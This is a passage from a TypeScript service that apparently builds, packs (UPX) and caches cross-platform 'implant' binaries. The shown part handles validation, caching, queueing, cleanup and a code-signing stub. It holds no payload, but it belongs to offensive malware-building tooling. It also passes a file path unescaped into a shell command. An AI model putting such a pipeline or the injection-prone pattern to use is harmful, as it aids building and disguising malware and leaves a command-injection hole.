        return { valid: false, error: 'Packed binary is empty' }
      }

      // Validate binary format using file command if available
      try {
        const ext = path.extname(binaryPath).toLowerCase()
        const isWindows = ext === '.exe' || ext === '.dll'
        const isLinux = ext === '' || binaryPath.includes('linux')
        const isMacOS = binaryPath.includes('darwin') || binaryPath.includes('macos')

        const { stdout } = await execAsync(`file "${binaryPath}"`, { timeout: 5000 })

        if (isWindows && !stdout.includes('PE32')) {
          return { valid: false, error: 'Invalid Windows PE binary after packing' }
        } else if (isLinux && !stdout.includes('ELF')) {
          return { valid: false, error: 'Invalid Linux ELF binary after packing' }
        } else if (isMacOS && !stdout.includes('Mach-O')) {
          return { valid: false, error: 'Invalid macOS Mach-O binary after packing' }
        }
      } catch {
        // file command not available, skip format check
      }

      // Check if UPX marker is present (for UPX-packed binaries)
      if (config.method === 'upx') {
        try {
          const fileBuffer = await fs.promises.readFile(binaryPath)
          const upxMarker = Buffer.from('UPX')
          const hasUPXMarker = fileBuffer.includes(upxMarker)

          if (!hasUPXMarker) {
            console.warn('[ValidatePackedBinary] UPX marker not found in packed binary')
            // Not necessarily an error, but worth noting
          }
        } catch {
          // Skip UPX marker check if file read fails
        }
      }

      return { valid: true }
    } catch (error) {
      return {
        valid: false,
        error: error instanceof Error ? error.message : 'Unknown validation error'
      }
    }
  }

  /**
   * Update packing statistics
   */
  private updatePackingStats(method: string, compressionRatio: number, fromCache: boolean): void {
    if (fromCache) {
      return // Don't update stats for cache hits
    }

    this.packingStats.totalPacked++

    // Update average compression ratio
    const totalRatio = this.packingStats.averageCompressionRatio * (this.packingStats.totalPacked - 1)
    this.packingStats.averageCompressionRatio = (totalRatio + compressionRatio) / this.packingStats.totalPacked

    // Update method usage
    if (!this.packingStats.methodUsage[method]) {
      this.packingStats.methodUsage[method] = 0
    }
    this.packingStats.methodUsage[method]++
  }

  /**
   * Load packing cache from disk
   */
  private async loadPackingCache(): Promise<void> {
    const fs = require('fs')
    const path = require('path')

    try {
      const cacheFile = path.join(this.cacheDir, 'packing-cache.json')
      if (fs.existsSync(cacheFile)) {
        const cacheData = await fs.promises.readFile(cacheFile, 'utf-8')
        const parsedCache = JSON.parse(cacheData)

        for (const [key, value] of Object.entries(parsedCache)) {
          const cacheEntry = value as { packedBinary: string; timestamp: number; metadata: any }
          // Convert base64 back to Buffer
          this.packingCache.set(key, {
            packedBinary: Buffer.from(cacheEntry.packedBinary, 'base64'),
            timestamp: cacheEntry.timestamp,
            metadata: cacheEntry.metadata
          })
        }

        console.log(`[LoadPackingCache] Loaded ${this.packingCache.size} cache entries`)
      }
    } catch (error) {
      console.warn('[LoadPackingCache] Failed to load cache:', error)
    }
  }

  /**
   * Save packing cache to disk
   */
  private async savePackingCache(): Promise<void> {
    const fs = require('fs')
    const path = require('path')

    try {
      const cacheFile = path.join(this.cacheDir, 'packing-cache.json')
      const cacheData: Record<string, { packedBinary: string; timestamp: number; metadata: any }> = {}

      for (const [key, value] of this.packingCache.entries()) {
        // Convert Buffer to base64 for JSON serialization
        cacheData[key] = {
          packedBinary: value.packedBinary.toString('base64'),
          timestamp: value.timestamp,
          metadata: value.metadata
        }
      }

      await fs.promises.writeFile(cacheFile, JSON.stringify(cacheData, null, 2))
      console.log(`[SavePackingCache] Saved ${this.packingCache.size} cache entries`)
    } catch (error) {
      console.error('[SavePackingCache] Failed to save cache:', error)
    }
  }

  /**
   * Get packing statistics
   */
  getPackingStats(): typeof this.packingStats {
    return { ...this.packingStats }
  }

  /**
   * Clear packing cache
   */
  clearPackingCache(): void {
    this.packingCache.clear()
    console.log('[ClearPackingCache] Cache cleared')
  }

  /**
   * Clear old cache entries based on age
   */
  clearOldPackingCache(maxAge: number = 24 * 60 * 60 * 1000): number {
    const now = Date.now()
    let clearedCount = 0

    for (const [key, value] of this.packingCache.entries()) {
      if (now - value.timestamp > maxAge) {
        this.packingCache.delete(key)
        clearedCount++
      }
    }

    console.log(`[ClearOldPackingCache] Cleared ${clearedCount} old cache entries`)
    return clearedCount
  }

  /**
   * Sign the binary
   */
  private async signBinary(binaryPath: string, signing: any): Promise<void> {
    // This would implement code signing
    // For now, just log the action
    console.log(`Signing binary: ${binaryPath}`)
  }

  /**
   * Get Go OS target
   */
  private getGoOS(type: string): string {
    switch (type) {
      case "windows-exe":
      case "windows-dll":
      case "windows-service":
        return "windows"
      case "linux-elf":
        return "linux"
      case "macos-dylib":
        return "darwin"
      default:
        return "windows"
    }
  }

  /**
   * Cleanup temporary files
   */
  private async cleanupTempFiles(requestId: string): Promise<void> {
    const files = [
      join(this.compilationDir, `${requestId}.go`),
      join(this.compilationDir, `${requestId}.o`),
      join(this.compilationDir, `${requestId}.exe`)
    ]

    for (const file of files) {
      try {
        await unlink(file)
      } catch {
        // Ignore cleanup errors
      }
    }
  }

  /**
   * Get compilation status
   */
  getCompilationStatus(requestId: string): CompilationResult | null {
    // Check all queues
    const allResults = [
      ...this.queue.completed,
      ...this.queue.failed
    ]

    return allResults.find(result => result.requestId === requestId) || null
  }

  /**
   * Get queue status
   */
  getQueueStatus(): CompilationQueue {
    return {
      pending: [...this.queue.pending],
      compiling: new Map(this.queue.compiling),
      completed: [...this.queue.completed],
      failed: [...this.queue.failed]
    }
  }

  /**
   * Cancel compilation
   */
  cancelCompilation(requestId: string): boolean {
    // Remove from pending queue
    const pendingIndex = this.queue.pending.findIndex(req => req.id === requestId)
    if (pendingIndex !== -1) {
      this.queue.pending.splice(pendingIndex, 1)
      return true
    }

    // Note: Cannot cancel if already compiling
    return false
  }

  /**
   * Clear old results
   */
  clearOldResults(maxAge: number = 24 * 60 * 60 * 1000): void {
    const now = Date.now()

    this.queue.completed = this.queue.completed.filter(result => 
      now - result.createdAt < maxAge
    )

    this.queue.failed = this.queue.failed.filter(result => 
      now - result.createdAt < maxAge
    )
  }

  /**
   * Create compilation templates
   */
  private async createCompilationTemplates(): Promise<void> {
    const goMod = `module implant-compilation

go 1.21

require (
	github.com/google/uuid v1.3.0
)
`

    await writeFile(join(this.templatesDir, "go.mod"), goMod)
  }

  /**
   * Destroy service
   */
  async destroy(): Promise<void> {
    // Save packing cache before destroying
    await this.savePackingCache()

    if (this.processingTimer) {
      clearInterval(this.processingTimer)
    }
    this.removeAllListeners()
  }
}